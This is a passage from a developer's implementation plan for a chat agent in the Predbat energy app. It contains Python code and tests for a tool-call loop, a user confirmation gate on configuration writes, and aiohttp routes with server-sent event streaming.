                # events - nothing ran, and the transcript should not suggest otherwise.
                for call in calls:
                    refused = {"success": False, "error": "Not run: the {} tool call limit for one turn was reached".format(self.max_tool_calls), "data": None}
                    await self.store.append(conversation_id, {"role": "tool", "tool_call_id": call.get("id") or "call_{}".format(turn_id), "name": (call.get("function") or {}).get("name") or "", "content": json.dumps(refused)})
                break
            for call in calls:
                await self._run_one_tool(conversation_id, turn_id, call)

        note = "I stopped after {} tool calls, which is the configured limit for one turn. Ask me to continue if you want me to keep going.".format(self.max_tool_calls)
        await self.store.append(conversation_id, {"role": "assistant", "content": note})
        self.emit(conversation_id, "assistant", {"text": note, "sources": []})

    async def _run_one_tool(self, conversation_id, turn_id, call):
        """Execute one tool call and append its result as a tool message."""
        name = (call.get("function") or {}).get("name") or ""
        call_id = call.get("id") or "call_{}".format(turn_id)
        raw = (call.get("function") or {}).get("arguments") or "{}"
        try:
            arguments = json.loads(raw) if raw.strip() else {}
            if not isinstance(arguments, dict):
                raise ValueError("arguments must be a JSON object")
        except ValueError as error:
            result = {"success": False, "error": "Could not read the tool argument JSON: {}".format(error), "data": None}
            self.emit(conversation_id, "tool_end", {"call_id": call_id, "name": name, "ok": False, "elapsed": 0, "preview": result["error"]})
            await self.store.append(conversation_id, {"role": "tool", "tool_call_id": call_id, "name": name, "content": json.dumps(result)})
            return

        started = time.monotonic()
        self.emit(conversation_id, "tool_start", {"call_id": call_id, "name": name, "arguments": arguments})
        try:
            result = await self._dispatch(conversation_id, name, arguments)
        except Exception as error:
            result = {"success": False, "error": "Tool '{}' failed: {}".format(name, error), "data": None}
        elapsed = round(time.monotonic() - started, 2)
        encoded = json.dumps(result)
        self.emit(conversation_id, "tool_end", {"call_id": call_id, "name": name, "ok": bool(result.get("success")), "elapsed": elapsed, "preview": encoded[:400]})
        await self.store.append(conversation_id, {"role": "tool", "tool_call_id": call_id, "name": name, "content": encoded})
```

Add this exception class beside `ChatBusyError`:

```python
class ChatRequestError(RuntimeError):
    """Raised when the chat-completions endpoint returns a non-200 response."""

    def __init__(self, status, body):
        """Keep the status and body so the message can name what actually went wrong."""
        super().__init__("HTTP {}: {}".format(status, body[:500]))
        self.status = status
        self.body = body

    def friendly(self):
        """Return a message worth showing a user rather than a raw HTTP error."""
        if self.status == 401:
            return "OpenRouter rejected the API key - check openrouter_api_key in apps.yaml"
        if self.status == 402:
            return "OpenRouter reports insufficient credit: {}".format(self.body[:200])
        if self.status == 429:
            return "Rate limited by OpenRouter, try again shortly"
        return "OpenRouter returned HTTP {}: {}".format(self.status, self.body[:200])
```

And a placeholder for the switch read, replaced properly in Task 8:

```python
    def web_search_enabled(self):
        """Return whether OpenRouter's web search plugin should be added to the request."""
        return False
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat > /tmp/chat_4.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/chat_4.txt | head -40
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/chat.py apps/predbat/tests/test_chat.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add the streaming agentic loop and tool dispatch

Alternates streamed completions with tool calls until the model answers
or max_tool_calls is reached, reassembling tool-call fragments by index
because the id and name arrive only in the first fragment.

Every failure the model can cause - unknown tool, malformed argument
JSON, a raising tool - comes back as a tool result rather than an
exception, so the model can correct itself instead of the turn dying.

Titles come from set_chat_title, with the first user message as a
fallback for models that ignore the instruction."
```

---

## Task 8: The write confirmation gate and the two switches

**Files:**
- Modify: `apps/predbat/chat.py`
- Modify: `apps/predbat/tests/test_chat.py`

**Interfaces:**
- Consumes: Task 7's `_run_one_tool` and `pending_confirm`.
- Produces:
  - `ChatAgent.confirm_writes_enabled() -> bool` · `ChatAgent.web_search_enabled() -> bool`
  - `async ChatAgent.await_confirmation(call_id) -> bool`
  - `ChatAgent.confirm(call_id, conversation_id, approved) -> bool`
  - `chat.CONFIRM_TIMEOUT_SECONDS = 300`, `chat.CONFIRM_POLL_SECONDS = 0.2`

- [ ] **Step 1: Write the failing tests**

Append to `apps/predbat/tests/test_chat.py`:

```python
def _write_call_response(entity_id="input_number.predbat_best_soc_keep", value="2.0"):
    """Build a chunk list for a streamed set_config call."""
    return _tool_call_response("set_config", {"entity_id": entity_id, "value": value}, call_id="call_write")


def _confirm_soon(agent, approved):
    """Answer the next pending confirmation from a background thread, as a browser would."""

    def answer():
        """Poll for the pending confirmation and resolve it."""
        for _ in range(200):
            with agent.lock:
                pending = dict(agent.pending_confirm)
            if pending:
                call_id = sorted(pending)[0]
                agent.confirm(call_id, pending[call_id]["conversation_id"], approved)
                return
            time.sleep(0.05)

    thread = threading.Thread(target=answer, daemon=True)
    thread.start()
    return thread


def test_write_confirmation_approved(my_predbat):
    """With the switch on, a write waits for approval and then executes."""
    failed = False
    print("**** Testing write confirmation - approved ****")
    agent = _agent_with_fake(my_predbat, _write_call_response(), _text_response("done"))
    agent.confirm_writes_enabled = lambda: True
    cid = asyncio.run(agent.store.create())

    _confirm_soon(agent, True)
    asyncio.run(agent.run_turn(cid, "raise best soc keep"))

    kinds = [event["type"] for event in agent.events_since(0, cid)[0]]
    for required in ("confirm", "confirm_result", "tool_start", "tool_end"):
        if required not in kinds:
            print("ERROR: approval path did not emit {!r}: {}".format(required, kinds))
            failed = True

    results = [message for message in asyncio.run(agent.store.get_messages(cid)) if message["role"] == "tool"]
    if not results or "declined" in str(results[0].get("content")).lower():
        print("ERROR: an approved write was not executed: {}".format(results))
        failed = True

    return failed


def test_write_confirmation_rejected(my_predbat):
    """A rejected write becomes an ordinary tool result so the model can respond to it."""
    failed = False
    print("**** Testing write confirmation - rejected ****")
    agent = _agent_with_fake(my_predbat, _write_call_response(), _text_response("understood"))
    agent.confirm_writes_enabled = lambda: True
    cid = asyncio.run(agent.store.create())

    _confirm_soon(agent, False)
    asyncio.run(agent.run_turn(cid, "raise best soc keep"))

    results = [message for message in asyncio.run(agent.store.get_messages(cid)) if message["role"] == "tool"]
    if not results or "declined" not in str(results[0].get("content")).lower():
        print("ERROR: a rejected write did not come back as a declined tool result: {}".format(results))
        failed = True
    if "tool_start" in [event["type"] for event in agent.events_since(0, cid)[0]]:
        print("ERROR: a rejected write still ran the tool")
        failed = True
    if agent.pending_confirm:
        print("ERROR: the pending confirmation outlived its turn")
        failed = True

    return failed


def test_write_confirmation_timeout(my_predbat):
    """An unanswered confirmation times out into a decline rather than hanging."""
    failed = False
    print("**** Testing write confirmation - timeout ****")
    agent = _agent_with_fake(my_predbat, _write_call_response(), _text_response("no answer"))
    agent.confirm_writes_enabled = lambda: True
    chat.CONFIRM_TIMEOUT_SECONDS_ORIGINAL = chat.CONFIRM_TIMEOUT_SECONDS
    chat.CONFIRM_TIMEOUT_SECONDS = 0.5
    try:
        cid = asyncio.run(agent.store.create())
        started = time.monotonic()
        asyncio.run(agent.run_turn(cid, "raise best soc keep"))
        elapsed = time.monotonic() - started
    finally:
        chat.CONFIRM_TIMEOUT_SECONDS = chat.CONFIRM_TIMEOUT_SECONDS_ORIGINAL

    if elapsed > 10:
        print("ERROR: the timeout path took {:.1f}s, so it is not honouring CONFIRM_TIMEOUT_SECONDS".format(elapsed))
        failed = True
    results = [message for message in asyncio.run(agent.store.get_messages(cid)) if message["role"] == "tool"]
    if not results or "declined" not in str(results[0].get("content")).lower():
        print("ERROR: a timed-out confirmation did not decline: {}".format(results))
        failed = True

    return failed


def test_write_without_confirmation(my_predbat):
    """With the switch off, a write executes directly but is still recorded in the transcript."""
    failed = False
    print("**** Testing writes with confirmation off ****")
    agent = _agent_with_fake(my_predbat, _write_call_response(), _text_response("changed"))
    agent.confirm_writes_enabled = lambda: False
    cid = asyncio.run(agent.store.create())

    asyncio.run(agent.run_turn(cid, "just do it"))

    kinds = [event["type"] for event in agent.events_since(0, cid)[0]]
    if "confirm" in kinds:
        print("ERROR: a confirmation was requested with the switch off")
        failed = True
    for required in ("tool_start", "tool_end"):
        if required not in kinds:
            print("ERROR: the write was not recorded in the transcript: {}".format(kinds))
            failed = True

    return failed


def test_web_search_switch(my_predbat):
    """The plugin is added only when the switch is on, and a foreign base URL warns once."""
    failed = False
    print("**** Testing the web search switch ****")
    off = _agent_with_fake(my_predbat, _text_response("no plugin"))
    off.web_search_enabled = lambda: False
    cid = asyncio.run(off.store.create())
    asyncio.run(off.run_turn(cid, "hello"))
    if "plugins" in off.fake.payloads[0]:
        print("ERROR: the web plugin was sent with the switch off")
        failed = True

    on = _agent_with_fake(my_predbat, _text_response("with plugin"))
    on.web_search_enabled = lambda: True
    cid2 = asyncio.run(on.store.create())
    asyncio.run(on.run_turn(cid2, "hello"))
    if on.fake.payloads[0].get("plugins") != [{"id": "web"}]:
        print("ERROR: the web plugin was not sent with the switch on: {}".format(on.fake.payloads[0].get("plugins")))
        failed = True

    foreign = _make_agent(my_predbat, base_url="http://localhost:11434/v1")
    warnings = []
    foreign.log = lambda message, **kwargs: warnings.append(str(message))
    foreign.get_ha_config = lambda name, default: (True, False)
    foreign.web_search_enabled()
    foreign.web_search_enabled()
    matched = [line for line in warnings if "web search" in line.lower()]
    if len(matched) != 1:
        print("ERROR: expected exactly one warning for a non-OpenRouter base URL, got {}".format(matched))
        failed = True

    return failed
```

Add `import threading`, `import time` and `import chat` to the test file's imports, and extend the driver with the five new tests.

- [ ] **Step 2: Run the tests to verify they fail**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat > /tmp/chat_5.txt 2>&1; grep -iE "AttributeError|ERROR" /tmp/chat_5.txt | head -20
```

Expected: FAIL — `confirm` and `await_confirmation` do not exist, and the plugin is never sent.

- [ ] **Step 3: Implement the gate and the switches**

Add near the top of `apps/predbat/chat.py`:

```python
CONFIRM_TIMEOUT_SECONDS = 300
CONFIRM_POLL_SECONDS = 0.2
```

Replace the `web_search_enabled()` placeholder from Task 7 and add the rest:

```python
    def confirm_writes_enabled(self):
        """Return whether a write tool must be confirmed before it runs.

        Read at the moment the tool is called rather than cached at turn start, so toggling the
        switch mid-turn takes effect on the next tool call.
        """
        value, _ = self.get_ha_config("chat_confirm_writes", True)
        return True if value is None else bool(value)

    def web_search_enabled(self):
        """Return whether OpenRouter's web search plugin should be added to the request.

        The plugin is an OpenRouter feature. If the user has pointed openrouter_base_url at
        something else it is silently ignored by that endpoint, so say so once rather than
        leaving them wondering why nothing changed.
        """
        value, _ = self.get_ha_config("chat_web_search", False)
        if not value:
            return False
        if "openrouter.ai" not in self.base_url:
            if not self.warned_web_search_base_url:
                self.warned_web_search_base_url = True
                self.log("Warn: chat web search is enabled but openrouter_base_url is '{}', which is not OpenRouter - the web plugin will be ignored by that endpoint".format(self.base_url))
            return False
        return True

    def confirm(self, call_id, conversation_id, approved):
        """Record a user's answer to a pending write confirmation."""
        with self.lock:
            pending = self.pending_confirm.get(call_id)
            if pending is None or pending.get("conversation_id") != conversation_id:
                return False
            pending["approved"] = bool(approved)
        self.emit(conversation_id, "confirm_result", {"call_id": call_id, "approved": bool(approved)})
        return True

    async def await_confirmation(self, call_id):
        """Wait for a confirmation answer, polling rather than blocking on a primitive.

        Polling keeps this free of loop-bound objects, so the turn runs correctly on whichever
        event loop invoked it. The time spent parked is added back to the turn deadline: a user
        who steps away should not turn their own approval into a timeout.
        """
        started = time.monotonic()
        while time.monotonic() - started < CONFIRM_TIMEOUT_SECONDS:
            with self.lock:
                pending = self.pending_confirm.get(call_id)
                if pending is None:
                    break
                if pending.get("approved") is not None:
                    self.deadline += time.monotonic() - started
                    return bool(pending["approved"])
            await asyncio.sleep(CONFIRM_POLL_SECONDS)
        self.deadline += time.monotonic() - started
        return False
```

Then insert the gate at the top of `_run_one_tool`, immediately after the arguments have been decoded and before `started = time.monotonic()`:

```python
        definition = self.tool_defs_by_name.get(name) or {}
        if definition.get("writes") and self.confirm_writes_enabled():
            with self.lock:
                self.pending_confirm[call_id] = {"conversation_id": conversation_id, "turn_id": turn_id, "approved": None}
            self.emit(conversation_id, "confirm", {"call_id": call_id, "name": name, "arguments": arguments})
            approved = await self.await_confirmation(call_id)
            with self.lock:
                self.pending_confirm.pop(call_id, None)
            if not approved:
                result = {"success": False, "error": "User declined this change", "data": None}
                await self.store.append(conversation_id, {"role": "tool", "tool_call_id": call_id, "name": name, "content": json.dumps(result)})
                return
```

Feeding a decline back as an ordinary tool result rather than aborting is deliberate: the model
acknowledges it and offers an alternative, which is what a user expects from a refusal.

- [ ] **Step 4: Run the tests to verify they pass**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test chat > /tmp/chat_6.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/chat_6.txt | head -40
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/chat.py apps/predbat/tests/test_chat.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): gate Predbat writes behind a confirmation

chat_confirm_writes is on by default: a set_config or set_plan_override
parks the turn and shows the actual tool and arguments for approval,
rather than the model's description of them.

A decline or a timeout becomes an ordinary tool result so the model can
acknowledge it and offer an alternative. Waiting is polled rather than
blocking on a synchronisation primitive, which keeps the turn free of
loop-bound state, and the parked time is added back to the deadline so a
user who steps away does not time out their own approval."
```

---

## Task 9: The web layer — routes and SSE

The handlers here are a thin transport. They start turns, read the event buffer and mutate the
conversation index — they never run a model conversation or a tool themselves. Three call
shapes, matching the cross-thread contract in Global Constraints: `submit_turn()` synchronously
for starting a turn, `await agent.run_on_agent_loop(...)` for store mutations whose result the
handler needs, and direct calls for lock-guarded in-memory reads.

**Files:**
- Create: `apps/predbat/web_chat.py`
- Create: `apps/predbat/tests/test_web_chat.py`
- Modify: `apps/predbat/web.py`
- Modify: `apps/predbat/unit_test.py`

**Interfaces:**
- Consumes: `ChatAgent` (Tasks 6-8); `AnnualPage(self)` construction pattern at `apps/predbat/web.py:309`; `_register_annual_routes(app)` split pattern at `apps/predbat/web.py:412`.
- Produces:
  - `web_chat.WebChat(web_interface)` with `.web`, `.base`, `.log`, `.agent` (resolved lazily)
  - Handlers `html_chat`, `html_chat_conversations`, `html_chat_create`, `html_chat_rename`, `html_chat_delete`, `html_chat_history`, `html_chat_send`, `html_chat_stream`, `html_chat_confirm`, `html_chat_cancel`, `html_chat_models`, `html_chat_model`
  - `WebInterface._register_chat_routes(app)` and `WebInterface.chat_enabled()`
  - `web_chat.SSE_POLL_SECONDS = 0.1`, `SSE_HEARTBEAT_SECONDS = 15`

- [ ] **Step 1: Write the failing test**

Create `apps/predbat/tests/test_web_chat.py` with the house header, then:

```python
"""Tests for the Chat tab's routes and its server-sent event stream.

Routes are asserted against a bare aiohttp Application rather than a listening server - building
one performs no network I/O, which is the same trick test_web_annual.py uses.
"""

import asyncio

from aiohttp import web as aiohttp_web

import web_chat
from web import WebInterface
from web_chat import WebChat, format_sse_event


class FakeRequest:
    """A minimal aiohttp-request stand-in exposing the query and JSON body a handler reads."""

    def __init__(self, query=None, body=None):
        """Hold the query string and JSON body this request should present."""
        self.query = query or {}
        self._body = body or {}

    async def json(self):
        """Return the decoded JSON body."""
        return self._body


def _make_web(my_predbat, agent=None):
    """Build a WebInterface bound to my_predbat without standing up the aiohttp app."""
    interface = WebInterface.__new__(WebInterface)
    interface.base = my_predbat
    interface.log = my_predbat.log
    interface.prefix = my_predbat.prefix
    interface.registered_endpoints = []
    interface.chat_page = WebChat(interface)
    interface.chat_page.agent_override = agent
    return interface


def test_routes_registered_only_when_enabled(my_predbat):
    """The chat routes and nav link appear only when the component is configured."""
    failed = False
    print("**** Testing chat route registration ****")

    class NoChat:
        """A components registry with no chat component."""

        def get_component(self, name):
            """Return nothing for every component."""
            return None

    class WithChat:
        """A components registry that has a chat component."""

        def get_component(self, name):
            """Return a stand-in component for 'chat' only."""
            return object() if name == "chat" else None

    interface = _make_web(my_predbat)
    my_predbat.components = NoChat()
    if interface.chat_enabled():
        print("ERROR: chat reported as enabled with no component")
        failed = True
    app = aiohttp_web.Application()
    interface._register_chat_routes(app)
    if [route for route in app.router.routes() if "/chat" in str(route.resource)]:
        print("ERROR: chat routes were registered with no component")
        failed = True

    my_predbat.components = WithChat()
    if not interface.chat_enabled():
        print("ERROR: chat reported as disabled with a component present")
        failed = True
    app = aiohttp_web.Application()
    interface._register_chat_routes(app)
    paths = {str(route.resource.canonical) for route in app.router.routes()}
    for expected in ["/chat", "/chat/conversations", "/chat/history", "/chat/send", "/chat/stream", "/chat/confirm", "/chat/cancel", "/chat/delete", "/chat/rename", "/chat/models", "/chat/model"]:
        if expected not in paths:
            print("ERROR: route {} was not registered, got {}".format(expected, sorted(paths)))
            failed = True

    return failed


def test_send_is_busy_and_unknown_is_404(my_predbat):
    """Sending during a turn returns 409 naming the busy conversation; unknown ids 404."""
    failed = False
    print("**** Testing chat send busy and unknown conversation handling ****")

    from chat import ChatBusyError

    class BusyAgent:
        """An agent stand-in that is always mid-turn."""

        active = {"conversation_id": "aaaabbbbccccdddd", "turn_id": 3, "title": "why is it charging at 3am"}

        def submit_turn(self, conversation, message):
            """Refuse the handoff the way a busy component would."""
            raise ChatBusyError("A reply is already in progress in 'why is it charging at 3am'")

        class store:
            """A conversation store stand-in that knows one conversation."""

            @staticmethod
            def get_meta(cid):
                """Resolve only the known conversation id."""
                return {"id": cid, "title": "known"} if cid == "aaaabbbbccccdddd" else None

    interface = _make_web(my_predbat, agent=BusyAgent())
    page = interface.chat_page

    response = asyncio.run(page.html_chat_send(FakeRequest(body={"conversation": "aaaabbbbccccdddd", "message": "hello"})))
    if response.status != 409:
        print("ERROR: sending during a turn returned {}, expected 409".format(response.status))
        failed = True
    elif "why is it charging at 3am" not in response.text:
        print("ERROR: the 409 body does not name the busy conversation: {}".format(response.text))
        failed = True

    for handler, payload in [(page.html_chat_send, {"conversation": "ffffffffffffffff", "message": "x"}), (page.html_chat_delete, {"id": "ffffffffffffffff"}), (page.html_chat_rename, {"id": "ffffffffffffffff", "title": "x"})]:
        result = asyncio.run(handler(FakeRequest(body=payload)))
        if result.status != 404:
            print("ERROR: {} returned {} for an unknown id, expected 404".format(handler.__name__, result.status))
            failed = True

    history = asyncio.run(page.html_chat_history(FakeRequest(query={"conversation": "ffffffffffffffff"})))
    if history.status != 404:
        print("ERROR: history for an unknown conversation returned {}, expected 404".format(history.status))
        failed = True

    return failed


def test_delete_refuses_the_active_conversation(my_predbat):
    """The conversation with the running turn cannot be deleted out from under it."""
    failed = False
    print("**** Testing delete of the active conversation ****")

    class BusyAgent:
        """An agent stand-in mid-turn in a known conversation."""

        active = {"conversation_id": "aaaabbbbccccdddd", "turn_id": 1, "title": "busy one"}

        class store:
            """A store stand-in that knows the busy conversation."""

            @staticmethod
            def get_meta(cid):
                """Resolve the busy conversation."""
                return {"id": cid, "title": "busy one"} if cid == "aaaabbbbccccdddd" else None

    page = _make_web(my_predbat, agent=BusyAgent()).chat_page
    response = asyncio.run(page.html_chat_delete(FakeRequest(body={"id": "aaaabbbbccccdddd"})))
    if response.status != 409:
        print("ERROR: deleting the active conversation returned {}, expected 409".format(response.status))
        failed = True
    return failed


def test_sse_framing(my_predbat):
    """Events are framed with id/event/data lines and JSON-encoded payloads."""
    failed = False
    print("**** Testing SSE framing ****")
    frame = format_sse_event({"seq": 7, "conversation_id": "abcd", "type": "delta", "data": {"text": "hi\nthere"}})
    if not frame.startswith("id: 7\n"):
        print("ERROR: frame does not start with its id: {!r}".format(frame))
        failed = True
    if "event: delta\n" not in frame:
        print("ERROR: frame is missing its event line: {!r}".format(frame))
        failed = True
    if not frame.endswith("\n\n"):
        print("ERROR: frame is not terminated by a blank line: {!r}".format(frame))
        failed = True
    if "\nhere" in frame.split("data: ")[1].split("\n")[0]:
        print("ERROR: a newline in the payload broke the data line - it must be JSON encoded")
        failed = True
    return failed


def test_markdown_escapes_before_transforming(my_predbat):
    """The client renderer escapes HTML before applying markdown, for text and for titles."""
    failed = False
    print("**** Testing the client markdown renderer ****")
    script = web_chat.get_chat_script()
    if "function renderMarkdown" not in script:
        print("ERROR: the client script has no renderMarkdown function")
        return True

    escape_index = script.find("function escapeHtml")
    render_index = script.find("function renderMarkdown")
    if escape_index < 0:
        print("ERROR: the client script has no escapeHtml function")
        failed = True
    body = script[render_index : render_index + 800]
    if "escapeHtml(" not in body:
        print("ERROR: renderMarkdown does not escape before transforming - this is the XSS path")
        failed = True
    if "innerHTML" in script and "escapeHtml" not in script:
        print("ERROR: the client script assigns innerHTML without an escape helper")
        failed = True
    for sink in ["setTitleText", "renderMarkdown"]:
        if sink not in script:
            print("ERROR: the client script is missing {}, so titles may be injected raw".format(sink))
            failed = True
    return failed


def run_web_chat_tests(my_predbat):
    """Run every Chat tab web layer test, returning True if any of them failed."""
    failed = False
    failed |= test_routes_registered_only_when_enabled(my_predbat)
    failed |= test_send_is_busy_and_unknown_is_404(my_predbat)
    failed |= test_delete_refuses_the_active_conversation(my_predbat)
    failed |= test_sse_framing(my_predbat)
    failed |= test_markdown_escapes_before_transforming(my_predbat)
    return failed
```

Register with `from tests.test_web_chat import run_web_chat_tests` and:

```python
        ("web_chat", run_web_chat_tests, "Chat tab route, SSE framing and markdown escaping tests", False),
```

- [ ] **Step 2: Run the test to verify it fails**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test web_chat > /tmp/web_chat_1.txt 2>&1; grep -iE "ModuleNotFound|ImportError|ERROR" /tmp/web_chat_1.txt | head -20
```

Expected: FAIL with `ModuleNotFoundError: No module named 'web_chat'`.

- [ ] **Step 3: Create `web_chat.py` with the routes and the stream**

Create `apps/predbat/web_chat.py` with the house header and:

```python
"""The Chat tab: its page, its routes and its server-sent event stream.

Which conversation a browser is looking at is client state, passed on every request, so two
browsers never fight over a shared cursor. The only global server state is the single active
turn, and busy/idle events reach every browser whatever conversation it is viewing - which is
what lets a user read another conversation while a turn runs.
"""

import asyncio
import json

from aiohttp import web

from chat import AgentNotReadyError, ChatBusyError

SSE_POLL_SECONDS = 0.1
SSE_HEARTBEAT_SECONDS = 15


def format_sse_event(event):
    """Render one buffered event as an SSE frame."""
    return "id: {}\nevent: {}\ndata: {}\n\n".format(event["seq"], event["type"], json.dumps(event.get("data") or {}))


class WebChat:
    """Serves the Chat tab and streams turns to the browser."""

    def __init__(self, web_interface):
        """Attach to the running web interface so the chat component is reachable."""
        self.web = web_interface
        self.base = web_interface.base
        self.log = web_interface.log
        self.agent_override = None

    @property
    def agent(self):
        """Return the chat component, or None when it is not configured."""
        if self.agent_override is not None:
            return self.agent_override
        components = getattr(self.base, "components", None)
        return components.get_component("chat") if components else None

    def _conversation_or_404(self, agent, conversation_id):
        """Return a conversation's metadata, or a 404 response to return instead."""
        meta = agent.store.get_meta(conversation_id) if conversation_id else None
        if meta is None:
            return None, web.json_response({"error": "Unknown conversation"}, status=404)
        return meta, None

    async def html_chat(self, request):
        """Render the Chat tab."""
        text = self.web.get_header("Predbat Chat")
        text += get_chat_styles()
        text += get_chat_body()
        text += "<script>{}</script>".format(get_chat_script())
        text += "</body></html>"
        return web.Response(content_type="text/html", text=text)

    async def html_chat_conversations(self, request):
        """List the conversations a user can see, plus which one is mid-turn."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        pending = {entry["conversation_id"] for entry in agent.pending_confirm.values()}
        conversations = []
        for meta in agent.store.list_conversations():
            conversations.append({"id": meta["id"], "title": meta.get("title"), "updated": meta.get("updated"), "message_count": meta.get("message_count", 0), "cost": (meta.get("usage_total") or {}).get("cost", 0), "pending_confirm": meta["id"] in pending})
        return web.json_response({"conversations": conversations, "active": agent.active, "default_model": agent.default_model})

    async def html_chat_create(self, request):
        """Create a conversation and return its id."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        protect = (agent.active or {}).get("conversation_id")
        try:
            cid = await agent.run_on_agent_loop(agent.store.create(protect_id=protect))
        except AgentNotReadyError:
            return web.json_response({"error": "The chat component is still starting"}, status=503)
        return web.json_response({"id": cid})

    async def html_chat_rename(self, request):
        """Rename a conversation."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        body = await request.json()
        meta, error = self._conversation_or_404(agent, body.get("id"))
        if error:
            return error
        title = agent.store.rename(body.get("id"), body.get("title"))
        await agent.run_on_agent_loop(agent.store.flush(body.get("id")))
        return web.json_response({"id": body.get("id"), "title": title})

    async def html_chat_delete(self, request):
        """Hide a conversation, refusing the one with the running turn."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        body = await request.json()
        cid = body.get("id")
        meta, error = self._conversation_or_404(agent, cid)
        if error:
            return error
        if (agent.active or {}).get("conversation_id") == cid:
            return web.json_response({"error": "busy", "message": "This conversation is mid-reply"}, status=409)
        await agent.run_on_agent_loop(agent.store.delete(cid))
        return web.json_response({"deleted": cid})

    async def html_chat_history(self, request):
        """Return one conversation's full transcript for first paint."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        cid = request.query.get("conversation")
        meta, error = self._conversation_or_404(agent, cid)
        if error:
            return error
        messages = await agent.run_on_agent_loop(agent.store.get_messages(cid))
        _, cursor, _ = agent.events_since(0, cid)
        return web.json_response({"id": cid, "title": meta.get("title"), "model": meta.get("model"), "usage_total": meta.get("usage_total"), "messages": messages or [], "cursor": cursor, "active": agent.active})

    async def html_chat_send(self, request):
        """Start a turn, or refuse with 409 when one is already running."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        body = await request.json()
        cid = body.get("conversation")
        meta, error = self._conversation_or_404(agent, cid)
        if error:
            return error
        message = str(body.get("message") or "").strip()
        if not message:
            return web.json_response({"error": "Message is empty"}, status=400)
        # submit_turn claims the slot under the lock and schedules the turn on the component's
        # own loop, so this returns while the reply is still being produced. Everything the user
        # sees arrives over the SSE stream; there is nothing for this request to wait for.
        try:
            turn_id = agent.submit_turn(cid, message)
        except ChatBusyError:
            active = agent.active or {}
            return web.json_response({"error": "busy", "conversation_id": active.get("conversation_id"), "title": active.get("title")}, status=409)
        except AgentNotReadyError:
            return web.json_response({"error": "The chat component is still starting"}, status=503)
        except KeyError:
            return web.json_response({"error": "Unknown conversation"}, status=404)
        return web.json_response({"turn_id": turn_id})

    async def html_chat_confirm(self, request):
        """Answer a pending write confirmation."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        body = await request.json()
        if not agent.confirm(body.get("call_id"), body.get("conversation"), bool(body.get("approve"))):
            return web.json_response({"error": "Unknown or expired confirmation"}, status=404)
        return web.json_response({"ok": True})

    async def html_chat_cancel(self, request):
        """Ask the running turn to stop at its next checkpoint."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        agent.deadline = 0
        return web.json_response({"ok": True})

    async def html_chat_stream(self, request):
        """Stream events for one conversation, plus every global event, as SSE."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        cid = request.query.get("conversation")
        cursor = int(request.query.get("cursor") or 0)

        response = web.StreamResponse(status=200, headers={"Content-Type": "text/event-stream", "Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"})
        await response.prepare(request)
        idle = 0.0
        try:
            while True:
                events, cursor, reload_needed = agent.events_since(cursor, cid)
                if reload_needed:
                    await response.write(b"event: reload\ndata: {}\n\n")
                    break
                for event in events:
                    await response.write(format_sse_event(event).encode("utf-8"))
                    idle = 0.0
                if not events:
                    idle += SSE_POLL_SECONDS
                    if idle >= SSE_HEARTBEAT_SECONDS:
                        await response.write(b": heartbeat\n\n")
                        idle = 0.0
                await asyncio.sleep(SSE_POLL_SECONDS)
        except (ConnectionResetError, asyncio.CancelledError):
            pass
        return response
```

`get_chat_styles()`, `get_chat_body()`, `get_chat_script()`, `html_chat_models` and `html_chat_model` are added in Tasks 10 and 11. For this task, stub the three render helpers so the module imports and the route test passes:

```python
def get_chat_styles():
    """Return the Chat tab's CSS."""
    return "<style></style>"


def get_chat_body():
    """Return the Chat tab's markup."""
    return "<body><div id='chat-root'></div>"


def get_chat_script():
    """Return the Chat tab's client script."""
    return "function escapeHtml(text){return String(text).replace(/[&<>\"']/g, function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'}[c];});}\nfunction renderMarkdown(text){var safe = escapeHtml(text); return safe;}\nfunction setTitleText(node, title){node.textContent = title;}\n"
```

- [ ] **Step 4: Wire the routes into `web.py`**

In `apps/predbat/web.py`:

1. Add `from web_chat import WebChat` beside the other page imports.
2. In `initialize()` (after `self.annual_page = AnnualPage(self)` at line 309): `self.chat_page = WebChat(self)`.
3. Add these two methods beside `_register_annual_routes`:

```python
    def chat_enabled(self):
        """Return whether the chat component is configured and running."""
        components = getattr(self.base, "components", None)
        return bool(components and components.get_component("chat"))

    def _register_chat_routes(self, app):
        """Register the Chat tab's routes on ``app``, but only when chat is configured.

        Split out of start() the same way the annual routes are, so a test can assert the routes
        exist against a bare aiohttp Application without opening a socket.
        """
        if not self.chat_enabled():
            return
        app.router.add_get("/chat", self.chat_page.html_chat)
        app.router.add_get("/chat/conversations", self.chat_page.html_chat_conversations)
        app.router.add_post("/chat/conversations", self.chat_page.html_chat_create)
        app.router.add_post("/chat/rename", self.chat_page.html_chat_rename)
        app.router.add_post("/chat/delete", self.chat_page.html_chat_delete)
        app.router.add_get("/chat/history", self.chat_page.html_chat_history)
        app.router.add_post("/chat/send", self.chat_page.html_chat_send)
